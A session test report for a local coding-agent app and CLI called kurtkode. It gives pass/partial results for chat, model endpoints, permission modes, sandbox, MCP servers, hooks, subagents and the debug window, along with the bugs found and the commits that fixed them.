# kurtkode: functional test results

Session 6, 2026-10-12. Suite: `FUNCTIONAL_TESTS.md`. Build under test: HEAD 9dfd971 (code as of a47795a), Debug app
with hooks, Release app, release CLI. Models: google/gemma-4-26b-a4b-qat on This Mac (64k, 1 slot, loaded by the
user/session 5; not touched), qwen/qwen3.5-9b on the LAN LM Studio ("bang"), mock servers. Test projects in the session
scratchpad (`calc/`, `parts/`: 8 files `lib/partN.py`, ~5.4 KB each, a class and "keeps N records" in each).
Screenshots in the scratchpad `ft/shots/` (named by test ID); not kept in the repo.

## 0. Build and smoke

| ID | Result | Evidence | Notes |
|---|---|---|---|
| 0.1 | pass | `✔ Test run with 223 tests passed after 5.5 s` | |
| 0.2 | pass | build / release / cli: exit 0, 0 warnings, 0 errors | Debug build was already current (4 s); release 68 s |
| 0.3 | pass | window opens, sidebar lists chats and projects (0.3-main.png) | one 425 ms stall at launch (known leftover, HANDOFF item 6); none at idle over 40 s. A Debug window also opens at launch (window restoration) |
| 0.4 | pass | `--version` → `kurtkode 0.1`; `--help` lists inspect/replay/export; `inspect --help` covers all three | |

## 1. Chat basics

| ID | Result | Evidence | Notes |
|---|---|---|---|
| 1.1 | pass | session C18085B7; fenced Python block highlighted, **bold** rendered (1.1-chat.png); window and sidebar titled from the first line | the header record names the app's default model (qwen3-coder-30b) and a `model` record follows with Gemma; harmless, but the header is misleading |
| 1.2 | pass | "Thought for 140 tokens", collapsed; `reasoning` (508 chars) stored on the message, `reasoningTokens` 140 | |
| 1.3 | pass (U) | user: stop works, partial reply kept | checklist A step 1 |
| 1.4 | pass | `/retry`: `retract` record for the old reply, a new reply (487 tokens) follows | |
| 1.5 | pass | `/rename KK test six` → `title` record and window title; `/help` lists built-ins incl. `/agents` (1.5-help.png); `/context` → "about 2.6k of 64k tokens (3%) … summarized at about 28k" (1.5-context-crop.png); `/clear` → a "New chat" window | |
| 1.6 | pass | chatFolder set to a scratch folder: `list_dir .` → `notes-kk.txt`, read it, quoted it | chatFolder restored at the end |
| 1.7 | pass | `/mode plan`, quit, reopen with `KURTKODE_OPEN_SESSION`: title "KK test six", Plan (read-only), Gemma, both messages (1.7-*.png) | |

## 2. Models and endpoints

| ID | Result | Evidence | Notes |
|---|---|---|---|
| 2.1 | pass | session B141E5E6: turn 1 on bang (endpoint 9D1610F2, reported qwen/qwen3.5-9b), then a `model` record and turn 2 on Gemma (endpoint …C0DE) | the picker's list itself is seen in 2.5's browser (This Mac 6, Openrouter 459; bang's section is below the fold) |
| 2.2 | pass | asked bang for `qwen/qwen3.5-9b-nope`: orange "Asked for qwen/qwen3.5-9b-nope but qwen/qwen3.5-9b answered. Retry" under the reply (2.2-crop.png) | |
| 2.3 | pass | Models window: server running, memory 39% free of 69 GB, swap 19 GB; Gemma loaded, context 64k, peak 35.7 GB; Reload / Unload / Unload All; installed models with memory estimates (2.3-models.png) | slots (1) aren't shown for a loaded model; ternary-bonsai-27b shows an empty context stepper. Nothing pressed |
| 2.4 | pass (U) | user: bang answers the test message | checklist A step 2 |
| 2.5 | partial | sheet opens with lists (2.5-sheet.png). Stall when the sheet opens, three launches: **536**, 345, 320 ms (Debug build) | 1 of 3 over the 500 ms limit; far from the old 61 s. Debug builds are unoptimized; not checked in Release (no hooks there) |
| 2.6 | pass | a profile for bang:qwen3.5-9b with temperature 0.37 and max output 1234 (written to profiles.json, restored after): the request body had `temperature: 0.37`, `max_tokens: 1234`; the profile sheet showed both (2.6-crop.png) | the history-shape effect isn't visible in a one-turn request; shown in the sheet only |
| 2.7 $ | pass | after the user allowed the Keychain read (and raised the key's monthly cap: the first try got HTTP 403 "Key limit exceeded (monthly limit) … $1000.96 of $1000.00 used"): openai/gpt-oss-120b, provider **AkashML**, cost **$0.0000618** (1561 in, 80 out), recorded in meta; Debug Overview shows Provider and Cost, stats strip "Cost AkashML $0.0001" (2.7-c.png) | the 403 also showed the failure path: the turn recorded the server's message as its error |

## 3. Agent tools and permission modes (calc demo)

| ID | Result | Evidence | Notes |
|---|---|---|---|
| 3.1 | pass | session F04370FB: list_dir, grep `def add` → calc.py:4, read, bash (2 fail), read test, todo_write, edit (+2 −2), bash (3 ok), todo 2/2 | 11 requests, 3.5k prompt at the end |
| 3.2 | pass | Ask + `AUTOAPPROVE=2`: edit_file's approval `{"allowed":true,"decider":"user","waited":2.24}`; reads `decider: mode` | |
| 3.3 | pass (U) | user: the model took the denial feedback | checklist A step 3 |
| 3.4 | pass (H + U) | Accept Edits: edit_file `decider: mode`; bash `decider: user, waited 3.3` | user confirmed in the UI (checklist A step 4) |
| 3.5 | pass | Plan: request tools = read_file, list_dir, glob, grep, todo_write, task; the model read and proposed; tree unchanged | |
| 3.6 | pass (U) | user: after "Always allow", the same command ran without asking | checklist A step 5 |
| 3.7 | pass | `touch /tmp/kk-s6-x` exit 0; `touch ~/x-kk-test` "Operation not permitted … The sandbox blocked: write ~/x-kk-test"; curl "Could not resolve host … The sandbox blocked: network"; nothing in ~ | |
| 3.8 | pass | `REWIND_AFTER=4` after an edit + a new NOTES.md: calc.py's md5 back to the original, NOTES.md gone, 10 `retract` records | |
| 3.9 | pass | `seq 1 30000`: full output 169 KB in `.outputs/691937877-346B33.txt`, result marked truncated; the model saw 1…127 and …29937–30000 with "[… 111895 bytes omitted …]" | first try Gemma piped it through head/tail itself; the second prompt said not to. The kept 16 KB of digits cost ~16k tokens (prompt 2.1k → 18.2k) |
| 3.10 | pass | second identical `read_file README.md` → error result "You already called read_file with these arguments…", note "Not run: the same read as an earlier call" | |

## 4. Folders

| ID | Result | Evidence | Notes |
|---|---|---|---|
| 4.1 | pass | `KURTKODE_FOLDERS=…/rodir:ro`, Full Auto: read → "PELICAN-41"; write_file → "is in a read-only folder"; bash touch → "Operation not permitted … The sandbox blocked: write …/rodir/new2.txt"; folder unchanged | |
| 4.2 | pass | `…/rwdir:rw`, Accept Edits: edit_file `decider: mode`, file changed | Gemma also ran an `ls` first (asked, approved by the hook after 21 s) despite "run nothing" |
| 4.3 | pass | CLI `--add-dir rwdir --read-dir rodir -p`, then `-c -p`: `folders` record (rw writable, ro not); the model named both correctly; interactive `-c` banner: "+…/rwdir · +…/rodir (read-only) · resumed (4 messages)" | |

## 5. Composer

| ID | Result | Evidence | Notes |
|---|---|---|---|
| 5.1 | pass | `.kurtkode/commands/shout.md` with `$ARGUMENTS`; `/shout banana` → the user message is the expanded prompt "Reply with only the word banana…" → "BANANA" | |
| 5.2 | pass | `@lib/part3.py …`: a synthetic read_file call (id `at_262c4912_0`) with the file as its result, before the first request (5.4k prompt); answer "Basalt43, keeps 137" with no read of its own | |
| 5.3 | pass | `!ls lib` → user message with `userCommand {command: "ls lib", exitCode: 0, output: …}` and the text "I ran `ls lib` in the project myself. Output: …" | |
| 5.4 | pass | queued "Also read lib/part5.py…" 2 s in: injected after the 2nd tool result, before the 3rd request; the model read part5 and listed all three classes | |
| 5.5 | pass | 1600×1000 PNG to Gemma: "a large red circle … a blue square … the text "ZEBRA 17""; stored in `.images/` (49 KB); the wire record shows `[image, 64 KB as a data URL]` | prompt tokens 2070, so LM Studio doesn't count image tokens in usage |

## 7. Reliability paths (mock servers)

A scripted mock (`smock.py` in the scratchpad: one behavior per request: lost reply with a provider name, ok, empty, 429, die) in place of fault_proxy.py, so these didn't need the local model. CLI `-p` with `--endpoint mock=…`.

| ID | Result | Evidence | Notes |
|---|---|---|---|
| 7.1 | pass (C) | lost:Flaky then ok:Solid: request 2 carried `provider: {ignore: ["Flaky"]}`; turn 1 noted "Flaky lost the reply (80 tokens generated, nothing delivered); the same request went to another provider."; turn 2 "Avoiding providers that lost a reply: Flaky." | the Debug badge is checked in 10.1 |
| 7.2 | pass | lost on Flaky, Solid, Third (ignore lists grew), then "this turn went to the fallback model qwen/qwen3.5-9b"; bang answered; the run ended normally | `fallbackModel` default set for the test (it was unset), deleted after |
| 7.3 | pass | empty reply (0 tokens) → note "The reply was empty; the loop asked again: …"; the nudge text was the next request's last message; second reply used | |
| 7.4 | pass | 429 (Retry-After 1) then 200: wire record `statuses [429, 200]`, one reply | |
| 7.5 | **partial** | session intact: the failed turn is recorded (`stopReason failed`, error "The network connection was lost."), and `-c` later continued it | **`-p` prints no error**: stdout is one empty line, stderr empty, exit 1; `--output json` gives `"result":"","stop":"turn_stopped:failed"` with no error text. Interactive mode prints "! Could not connect to the server." |
| 7.6 | pass (optimized) / **fail (Debug)** | 30 KB Markdown (PLAN.md's start + a Swift block) at 110 tok/s. **Debug build**: 44 stalls from 30 s into the stream to its end, many 300–900 ms, worst **2275, 1774, 1654, 1451, 1358 ms** (the compaction test ran beside it). **Optimized build with hooks** (`build/PerfDD`, rebuilt from HEAD): one stall, 398 ms | the stalls grow with the reply's length, so per-update work is still proportional to the whole reply; optimization hides it at 30 KB. Not measured at larger sizes |

## 8. MCP and hooks

| ID | Result | Evidence | Notes |
|---|---|---|---|
| 8.1 | **partial** | project `.mcp.json` stdio server (the unit tests' mock_mcp_server.py), on bang: approval stored for that exact command (mcp-approvals.json, restored after). **First launch** (`KURTKODE_MCP_APPROVE=1`): the first request had **no mcp tools** (Qwen read the server's source and ran it through bash itself). **Second launch** (already approved): 8 `mcp__echoer__*` tools offered; `mcp__echoer__echo {"text":"kiwi-78"}` → "kiwi-78" | the request sent right after an approval doesn't wait for the newly started server. Seen with the hook; a user who sends right after clicking Start would hit it too |
| 8.2 | pass (C) | Streamable HTTP server (the unit tests' mock, auth check removed) via an interactive CLI: "Start it? y" → "4 MCP tools"; `web: echo {"text":"plum-82"}` → plum-82 | |
| 8.3 | pass (C) | project hooks approved in the interactive CLI, on bang: UserPromptSubmit text reached the model (answer ended with OKAPI); PostToolUse additionalContext in the next requests' bodies; PreToolUse exit 2 blocked `rm junk.txt` (file kept; the model was told why); Stop blocked once (GIRAFFE), the second Stop had `stop_hook_active: true` and the run ended | the CLI prints the block twice ("(hook: A PreToolUse hook blocked bash: …)" and "✗ A hook blocked this bash call: …") |
| 8.4 | pass (C) | unchanged hooks / MCP server: no question; Stop command changed → "Allow them?" again listing only the changed Stop hook; MCP args changed → "Start it?" again | same approval store as the app |

## 6. Context management (8-file demo)

| ID | Result | Evidence | Notes |
|---|---|---|---|
| 6.1 | pass (mechanism) | session D0B32218, `CONTEXT_LIMIT=9000`, Full Auto, 37 turns, 11 min: **8 compactions, every one shrank the prompt** (5888→3722, 6509→3860, 6451→3924, 6984→3720, 7078→3911, 6891→3979, 6910→3643, 6311→3889); 8 "Didn't compact: a summary would leave about 4184 of 4218 tokens; trimming older tool outputs instead." notes; peak prompt 6.8k | **task result poor**: NOTES.md lacks part7, part8's line has a stray `8\t` (a line number copied from a read), part5 lacks "keeps"; Gemma still said all eight were done (the known 8k garbling). The first attempt was cut off by my own test cleanup (stopped the instance), rerun from scratch |
| 6.2 | pass (H + U) | compaction rows in the Timeline ("Summarized: 6k → 3k tokens") and the Journal (summary text, 6.2-*.png); each compaction's `summaryRequests` has a wire record (e.g. 8D853E3D: HTTP 200, 15.0 s, max_tokens 2856) | user clicked a compaction row: it lists its summary request with HTTP, time, output tokens (checklist A step 7) |
| 6.3 | pass | `/compact focus on the record counts`: compaction record (3368→3108), summary has a "**Record Counts:**" section listing them; summary request max_tokens 4000 = min(4000, limit − prompt − 256) | the record has no focus field (the focus is only in the summary request) |
| 6.4 | pass | `summaryThinking` off (default written, deleted after): the `/compact` summary request had `reasoning_effort: "none"`, 14.7 s | a `/compact` right after another one sends nothing and says "**Couldn't summarize the conversation. The model didn't return a usable summary.**": misleading (nothing new to summarize; no request was made) |
| 6.5 | pass | toolbar 2.3k vs last prompt+reply 2064+188; 3.8k vs 3490+320 | |
| 6.6 | **partial** | trial 1: **FAIL 2/14**, 12 steps, 0 compactions: Gemma's 12th reply was the text `<tool_call|>` (2 tokens, finish stop), taken as the final answer. Trial 2: **PASS 14/14**, 47 steps, 5 compactions, 538 s; result JSON has `summaries` (5, with seconds and text) | a reply that is only a tool-call template token should count as a broken call (nudge), not an answer |

## 9. Subagents

| ID | Result | Evidence | Notes |
|---|---|---|---|
| 9.1 | pass | explore on Gemma (app): child 579CCA17 in `<session>.subagents/` with header agent/parent/parentCallID, 4 wire records of its own; task result carries `subagentRun`; parent wire folder holds only its own 2 requests | |
| 9.2 | pass (C) | custom `scout` with `model: bang|qwen/qwen3.5-9b`: child header endpoint 9D1610F2 (bang), model qwen/qwen3.5-9b; answer Heron10 | |
| 9.3 | pass | Agents tab while running ("Running · 1 turns · 1 calls · 4 s", Stop, Open in Debug) and after ("Completed · 4 turns · 3 calls · 4936 in · 197 out · 9 s") (9.3-agents.png) | |
| 9.4 | pass | `STOP_SUBAGENT_AFTER=5`: task result "[The user stopped this subagent before it finished. Don't run it again; carry on without its report.]"; the main agent answered | |
| 9.5 | pass (C) | pty, Gemma: one Ctrl-C after "⤷ explore subagent…" → "(stopped the subagent; the agent carries on…)", "⤶ subagent cancelled", the agent answered; two Ctrl-C 0.5 s apart → "^C (stopped)" back at the prompt | |
| 9.6 | pass (C) | explore (Gemma) + scout (bang) in one reply: both started 01:37:55.7; scout ended +17.5 s, explore +21.1 s; results in call order (explore first) | |
| 9.7 | pass | two explore on Gemma (1 slot): "Waiting for a free slot · 0 turns" beside "Running · 2 turns" (9.7-slot-c.png) | the second call ran first; results still in call order |
| 9.8 | pass (C) | two `scribe` (writers) in one reply: run b's requests 01:02:10–15.5; run a's first request 01:02:15.5, after b ended | both runs' headers are written at once, so the Agents tab shows the waiting one from the start |
| 9.9 | pass (C) | background scout on bang: "Started the scout subagent in the background…" returned at once; the report arrived as a user message with `subagentReport`; the loop waited for it; the final answer had all three classes | Qwen also read part7/8 itself and started a second, foreground scout (like Gemma in session 5) |
| 9.10 | pass (C) | `scribe` with background: true → error "background runs are for agents that only read …; scribe can change things, so run it without background." | |
| 9.11 | pass | app: `/agents` opened the inspector on the Agents tab (it was hidden, on Todos); CLI: "1. scout · Find class names in part7/8 · completed · 2 turns, 2 calls · 17.5 s · qwen/qwen3.5-9b" | |

## 10. Debug window

| ID | Result | Evidence | Notes |
|---|---|---|---|
| 10.1 | pass (H + U) | 7.1's session: turn 1 "lost" badge, Lost replies 1, the loop's note (10.1-lost.png); 6.1's session: Errors 4, Not run 3, Compactions 8 in the stats strip | user: Problems only and Tool = read_file filter as expected (checklist A step 8) |
| 10.2 | pass | turn 2 of a CLI session: Overview, Reasoning, Request (exact JSON), Response (raw SSE chunks), Diff ("adds 3 messages to the previous request") (10.2-*.png) | |
| 10.3 | pass | Journal on 6.1's session: lens on turn 20 ("held 12 messages, about 1k tokens"), selected todo_write with "in context for turns 20–23; then replaced by a compaction summary", provenance links ("from todo_write result, turn 2"), budget chart, group filters, search "Osprey12" → "1 of 2" | `KURTKODE_DEBUG_GROUPS` takes the first word of a group's name ("tool", not "tools"): my first try hid everything |
| 10.4 | pass | `DEBUG_SUBAGENT=1`: breadcrumb "Use the task tool… › turn 1 · explore: Find Osprey12…  Completed on gemma", the run's own turns and stats; the task call's Subagent section (agent, model, state, steps, tokens, time, Open Subagent); "Subagents 1 · 3 calls · 4936 in · 197 out" in the strip | live following not checked (the run had ended) |
| 10.5 | pass | `DEBUG_REPLAY=bang|qwen/qwen3.5-9b` on turn 2: "Changed: nothing but the model and endpoint", "Same tool calls", original vs replay table and texts; saved in `replays/`; Replays (1) | the hook can't set reasoning none; the CLI replay in 12.6 did |
| 10.6 | pass | sheet for Openrouter / openai/gpt-oss-120b: "Prompt: 2285 tokens (as recorded). $0.15 in / $0.60 out per million tokens; about $0.0003 for the prompt, plus the reply." No SecurityAgent | the key is only read when Replay is pressed (checked in ReplayViews.swift) |
| 10.7 | pass | `DEBUG_CURL` wrote a 13 KB command (`curl -sN …/chat/completions --data-binary @- <<'KURTKODE_JSON'`); running it streamed 46 SSE events from Gemma | |
| 10.8 | pass | fork before turn 5: new session with `forkedFrom`, `forkedAfter: false`, 4 turns, 4 wire records, 4 index lines; after: 5 / 5 / 5; each opened in a window titled "(fork before/after turn 5)" | |
| 10.9 | pass (U) | user: follows the main window when on, stays on a chosen session when off; Reload | checklist A step 6 |

## 11. Inspector and git

| ID | Result | Evidence | Notes |
|---|---|---|---|
| 11.1 | pass | after 3.1: Todos "2 of 2 done"; Changes "calc.py +2 −2" (11.1-inspector.png) | **the inspector is too narrow for its five tabs: "Todos" and "Context" are clipped** |
| 11.2 | pass | Context tab: "3.1k of 64k tokens", Compact Now, a Summaries list ("20:08: 6.3k → 3.9k tokens", …) | |
| 11.3 | pass | checklist B step 1 (computer use): diff, stage, unstage, commit, discard, all confirmed with git | the per-file + button isn't reachable through accessibility |

## 12. Command line

| ID | Result | Evidence | Notes |
|---|---|---|---|
| 12.1 | pass | `-p` text "pong"; json `{"model","result":"pong","session","stop":"completed","tool_calls":0,"type":"result","usage"}`; stream-json events assistant, finished, result; piped stdin appended (found "OTTER-5"); exit 0 | |
| 12.2 | pass | `--mode ask -p` write_file → refused with "The user can't approve actions in this run (kurtkode -p). Don't retry; say what you would do…"; the model explained and suggested `--mode auto`; no file | the refusal records `decider: "user"`, though no user decided |
| 12.3 | pass | pty: `/he`+Tab → `/help`; `xyz`, Ctrl-A, prefix, Ctrl-E → "Reply with exactly: xyz"; ↑ recalled and resent it; `@READ`+Tab → `@README.md` (attached and read); `one \` + `two` → "one \ntwo" | |
| 12.4 | pass | `--list-sessions` (id, time, count, title); `-r FAC157C4 -p` answered from that session (Heron10); `-c -p` continued the most recent one | |
| 12.5 | pass | `!echo started; sleep 30; …` + Ctrl-C after 3 s: stopped, "[Stopped by the user. Background processes it started were stopped.]" in the message; no sleep left; the next `!` worked | |
| 12.6 | pass | `inspect` table, `--turn 1` (reasoning, calls, approvals, results), `--json`, `--run 1`; `replay --turn 2 -m bang:qwen/qwen3.5-9b --reasoning none` with a comparison table, saved (and listed in the Debug window's Replays tab, 10.2); `export -o x.md` (9 KB), `--format json` (56 KB, with subagentRuns) | |
| 12.7 | pass | the CLI session 3ACB14C3 in the Debug window with its wire records (10.2) | |

## 13. Persistence and robustness

| ID | Result | Evidence | Notes |
|---|---|---|---|
| 13.1 | **partial** | half a record appended to 0D7498BC: `inspect` and `-r … -p` load it (line skipped) | **the next record was appended onto the torn line** (no newline first), so it was lost too: here a `model` record; it could be the user's message |
| 13.2 | pass | a 2026-09-27 session: Timeline with all 9 turns; Request tab "No wire record — Requests are recorded from this version on, while Settings → Generation → 'Record requests and responses' is on."; no crash | without a wire record the tab bar sits halfway down the pane |
| 13.3 | pass | stopped the test app 6 s into an explore run; reopened: "Cut off (no end recorded) · 2 turns · 2 calls" (13.3-c.png). A follow-up in that session worked (the dangling task call was reshaped) | |
| 13.4 | pass (unit) | a temporary Swift test (deleted after): WireLog with a 5 KB cap kept 4 of 20 records (4276 bytes), dropped the rest without error; a new WireLog on the folder kept counting | no permanent unit test covers the cap; worth adding |
| 13.5 | pass | Release app launched (main + Debug windows); `KURTKODE_AUTOSEND` ignored (no session, no autosend log): hooks absent; after `make install`, turns with a background subagent in the installed app (checklist B step 5) | |

## Not in the suite: found along the way

- **The CLI saves a run only when it ends** (`CLISession.run` collects records in memory, `CLISession.swift` ~line 300; interactive and `-p`): every record of a run has the same `at` time. If the process is killed or crashes mid-run, the run's messages are lost (the wire files stay), and the app/`inspect` can't follow a CLI run live. The app saves as it goes.
- The session header records the app's default model (qwen3-coder-30b) when a test picks another; a `model` record follows. Harmless, misleading when reading files.
- The Models window doesn't show a loaded model's parallel slots.

## 14. User checklist A (~20 min)

Use the Debug build beside your app: `open -n ~/git/kurtkode/build/DerivedData/Build/Products/Debug/kurtkode.app`.
Test folders (in Open Folder, press ⌘⇧G and paste): calc `/private/tmp/claude-1001/-Users-kurt-git-sugar-kurtagent/1055c283-5355-46b8-a0ff-6d577cedcb86/scratchpad/ft/calc`, subproj `/private/tmp/claude-1001/-Users-kurt-git-sugar-kurtagent/1055c283-5355-46b8-a0ff-6d577cedcb86/scratchpad/ft/subproj`.

1. **1.3 Stop.** New chat on Gemma: "Write a 600-word story about a lighthouse." Press Stop after ~3 s. *Stops within ~1 s; the partial reply stays, marked stopped.*
2. **2.4 Endpoint test.** Settings → Endpoints → bang → test message. *It answers; still one "bang" in the list.*
3. **3.3 Deny with feedback.** calc project, Ask mode: "Fix sub() in calc.py so it subtracts." At the edit approval, Deny with feedback "also add the comment # fixed on that line". *The model gets the feedback and makes the edit with the comment.*
4. **3.4 Accept Edits (UI).** Same project, Accept Edits: "Fix mean() in calc.py, then run python3 -m unittest -v". *The edit applies without asking; bash asks.*
5. **3.6 Always allow.** Ask mode: "Run ls -la." Approve with "Always allow". Then "Run ls -la again." *The second runs without asking; say where you see the rule listed.*
6. **10.9 Follow.** Window → Debug (⌥⌘D), "Follow the main window" on: pick other sessions in the sidebar; *the Debug window follows.* Turn it off and choose a session: *it stays put.* Reload.
7. **6.2 Compaction detail.** In the Debug window, the parts session "Read each of the eight files…": click a "Summarized: … tokens" row. *It lists its summary request: HTTP status, time, output tokens.*
8. **10.1 Filters.** Same session: Problems only, *only turns with errors / not-run calls*; Tool = read_file, *only read calls.*

## 15. User checklist B (~15 min)

1. **11.3 Git tab** (calc project, inspector → Git): status, a diff, stage, unstage, commit with a message; then change a file and Discard. *Matches `git -C <calc> status` and `log`.*
2. **Open in Debug** on the task card in the subproj session "Use the task tool with the explore agent to find which file…". *Opens the Debug window on the run.*
3. **Replay button.** Debug window → a turn → Replay… → This Mac, Gemma → Replay. *The reply streams, then the comparison.*
4. **Fork from the menu.** Fork ▸ Before This Turn. *The fork opens.*
5. **Your installed app** after `make install` (quit it first; it's the Release build, which also covers 13.5): one turn in any project, then "In the background, use the explore agent to find the class in lib/part8.py while you read lib/part1.py yourself" in subproj. *Agents tab shows the run; its report arrives as a card.*

## Summary

| Section | Pass | Partial (at test time) | Notes |
|---|---|---|---|
| 0 Build and smoke | 4 | | |
| 1 Chat basics | 7 | | 1.3 by the user |
| 2 Models and endpoints | 6 | 1 (2.5) | 2.4 by the user; 2.7 on OpenRouter ($0.00006) |
| 3 Tools and modes | 10 | | 3.3, 3.4, 3.6 by the user |
| 4 Folders | 3 | | |
| 5 Composer | 5 | | |
| 6 Context | 5 | 1 (6.6 → fixed, F1) | 6.2's click by the user |
| 7 Reliability | 5 | 1 (7.5 → fixed, F4) | 7.6 fine in Release up to 100 KB (F6) |
| 8 MCP and hooks | 3 | 1 (8.1 → fixed, F5) | |
| 9 Subagents | 11 | | |
| 10 Debug window | 9 | | 10.1's filters and 10.9 by the user |
| 11 Inspector and git | 3 | | 11.3 by computer use |
| 12 Command line | 7 | | |
| 13 Persistence | 4 | 1 (13.1 → fixed, F3) | 13.5 in the installed app |
| **Total (87)** | **82** | **5** (4 fixed since) | plus F2 (not in the suite), fixed |

The problems found (all but F6/F7 fixed since; see "Fixes after the run"):

| # | Problem | Test | Fix options (recommendation first) |
|---|---|---|---|
| F1 | A reply that is only a tool-call template token (`<tool_call|>`) ends the run as the "answer" | 6.6 | **Treat a reply made only of tool-call markers as empty, so the nudge (or text-call recovery) runs**; or add Gemma 4's markers to TextToolCalls |
| F2 | The CLI saves a run's records only when the run ends | found | **Persist each record as its event arrives (as the app does)**; or flush per turn |
| F3 | Appending to a session file with a torn last line glues the next record onto it (lost) | 13.1 | **Before appending, add a newline if the file doesn't end with one** (one check in SessionStore) |
| F4 | `kurtkode -p` prints nothing when the request fails (exit 1) | 7.5 | **Print the turn's error to stderr, and add `"error"` to the json/stream-json result** |
| F5 | The first request after approving a project MCP server goes out without its tools | 8.1 | **Wait for a newly approved server to start (as for the first request) before sending**; or re-read the hub's tools per request |
| F6 | Streaming a long reply stalls the Debug build badly (2.3 s); optimized is fine at 30 KB, but stalls grow with length | 7.6 | **Measure the optimized build at 60–100 KB first**; if it stalls, render only the last Markdown block while streaming |
| F7 | Small ones: inspector tabs clipped; `/compact` with nothing new says "Couldn't summarize…"; `-p` refusals recorded as decider "user"; the CLI prints a hook block twice; header model = app default; Debug detail tabs float without a wire record; model browser sheet 536 ms once (Debug) | 11.1, 6.4, 12.2, 8.3, 1.1, 13.2, 2.5 | fix in one small batch |

2.7 and both checklists were done later (below).

## Fixes after the run (2026-10-12, session 6)

| # | Commit | Check |
|---|---|---|
| F1 | 445c5da: a reply that is only a tool-call marker gets a nudge | new tests `asksAgainAfterAReplyOfOnlyAToolCallMarker`, `recognizesToolCallMarkers` |
| F3 | f684795: appends after a torn last line start a new line (session files and the wire index) | `skipsATornLastLine` extended; fails without the fix (`["one"]` vs `["one", "two"]`) |
| F4 | bfdbae6: `kurtkode -p` says why a run failed | new test `printModeReportsWhyARunFailed`; real CLI against a dead port: stderr "! Could not connect to the server." / "(the model's turn stopped: failed)", JSON `"error"` |
| F2 | b1e649c: the CLI saves each record as the run goes | new test `savesEachRecordAsTheRunGoes` (3 messages in the file when the tool result is shown; 1 before the fix); real run on bang: records timed 01.7 / 10.8 / 13.5 / 16.6 s, parallel results in call order |
| F5 | 77832b7: one MCP hub per project folder however its path is spelled | cause: hubs keyed by the path string; the hook approved through `/private/tmp/…` while the session uses `/tmp/…`. Rerun of 8.1's first launch on a new project: the first request had all 8 `mcp__echo2__*` tools, the call worked. The real banner already passed the session's path, so users weren't affected |

227 unit tests pass; app, CLI build with no warnings.

## F6 measured (optimized build with hooks, `build/PerfDD` from 77832b7)

Mock stream at 110 tok/s into a plain chat; hang log (≥250 ms) of that process only.

| Reply | Streaming | Stalls |
|---|---|---|
| 30 KB | 89 s | one, 359 ms (launch) |
| 60 KB | 175 s | one, 400 ms (launch) |
| 100 KB | 285 s | one, 381 ms (launch) |

So users (Release) aren't affected up to 100 KB; the Debug build's stalls are unoptimized code. One earlier 30 KB run on
the same build stalled 30 times (0.3–2 s) with one **17.4 s** stall, while a Keychain prompt was waiting for another test
instance and builds had just run; it didn't happen in three clean runs. Unexplained, seen once: worth a `sample` if it
ever shows up again. No code change for F6.

Correction to my notes above: the first 2.7 attempt's instance wasn't killed by the F5 rebuild. My launch helper
picked the highest PID as the new instance; PIDs had wrapped, so stopping "the F5 test instance" stopped the 2.7 one
(and left the F5 one running until the user noticed). The helper now compares PIDs before and after a launch.

## Checklist B (driven with computer use, 2026-10-13)

| Step | Result | Evidence |
|---|---|---|
| 1 Git tab (11.3) | pass | calc repo: diff of calc.py shown; Stage All → "Staged (1)" (`git status`: `M  calc.py`); Unstage All → back; Stage All, message, "Commit 1 File" → `bb6681b Fix sub (checklist B git test)` by the user's git identity; README.md changed outside, Refresh showed it; right-click → "Discard Changes…" → confirmation "Discard changes to README.md? … can't be undone" → discarded (`git status` clean but untracked) |
| 2 Open in Debug | pass | the task card's "Open in Debug" link drilled the Debug window into the run (breadcrumb, 4 turns, 3 calls) |
| 3 Replay button | pass | turn 2 → Replay… (This Mac, Gemma, "No list price … local models cost nothing") → "Replaying…" → comparison "Same tool calls", 2285/2285 prompt, 38/38 output; Replays (2) |
| 4 Fork menu | pass | Fork ▸ From Before This Turn → session 913AEE3C, `forkedFrom` A5F14060, `forkedAfter: false`, 3 messages; the Debug window followed it |
| 5 Installed app (13.5) | pass | after `make install` (Release of 77832b7): in the fork, a background explore run: Agents tab "Running … Stop" then "Completed"; "Waiting for 1 background subagent to report…"; report card "Report from the explore subagent: Find the class in lib/part8.py"; final answer Quillwort83 / Osprey12 (B5-installed.png) |

Notes from driving it: the per-file stage (+) button sits inside the row's disclosure label, so through accessibility a
press lands on the disclosure triangle (VoiceOver users can't stage one file; Stage All works); Discard is only in the
row's context menu. Background typing of Return in the composer inserts a newline (expected: AX text, not a key event).

13.5 → pass. With checklists A and B done, every test in the suite has been run.

## F7 leftovers (2026-10-13)

| Item | Commit | Check |
|---|---|---|
| Inspector tabs clipped | 45a17f6 | names when they fit, icons (tooltips, VoiceOver names) when not; at 240 pt: icons, nothing clipped |
| `/compact` with nothing new | fefe7c3 | shared check (the CLI's missed the continuation line); CLI and app both say "Nothing new to summarize since the last summary."; new test |
| `-p` refusals as decider "user" | e58e01a | new decision `.refuse`; recorded "refused before asking: nobody to ask (kurtkode -p)"; CLI test extended |
| CLI hook block printed twice | 7169756 | once, as the hook line; new test; real run on bang |
| Header names the default model | c1919f0 | a chat switched to bang:qwen before its first message has that in its header, no `model` record |
| Debug tabs float without a wire record | 8bfc0c0 | tabs at the top, "No wire record" centered below; Overview unchanged |
| Git per-file stage not accessible; Discard only in a menu | a151225 | "Stage README.md" / "Unstage README.md" pressed through accessibility, confirmed with git; Discard accessibility action added |
| Models window lacks slots | 671f4bc | "context 64k · 1 slot · peak 35.7 GB" |
| Model browser sheet stall | no change | optimized build: opening it costs 406–465 ms, of which ~320 ms is any sheet's first showing (the profile sheet: 321 ms); a refactor of its list didn't change it and was dropped. Under the 500 ms limit |

New, seen while testing: `/compact` on a very short chat makes the context bigger (CLI "about 1k tokens down to 2k";
app "2.0k → 2.3k"): the summary is longer than what it replaces. The planner that skips such compactions in the loop
doesn't apply to `/compact`.

Fixed in 0397ba0: `/compact` predicts the prompt a summary would leave and doesn't ask when it wouldn't be smaller
(tiny chat on bang: "Not summarized: the conversation is about 1993 tokens …, and a summary would leave about 2783",
no request made; app shows the same), drops a summary that comes back longer, and counts the new summary in place of
the old one. A chat that had read two 5 KB files still compacted: about 6k → 2k. Four new tests; 232 pass.
## Round 2 (session 7, 2026-10-13)

Build under test: HEAD 1826fe4 (code as of 0397ba0): Debug app with hooks, `build/PerfDD` (optimized, hooks) rebuilt
from HEAD, release CLI and eval. Models: Gemma 4 26B on This Mac (64k, 1 slot, the user's, untouched; used by the
16.9 eval), qwen/qwen3.5-9b on bang (LAN), mock servers (`smock.py`, extended with any HTTP status and `drop`).
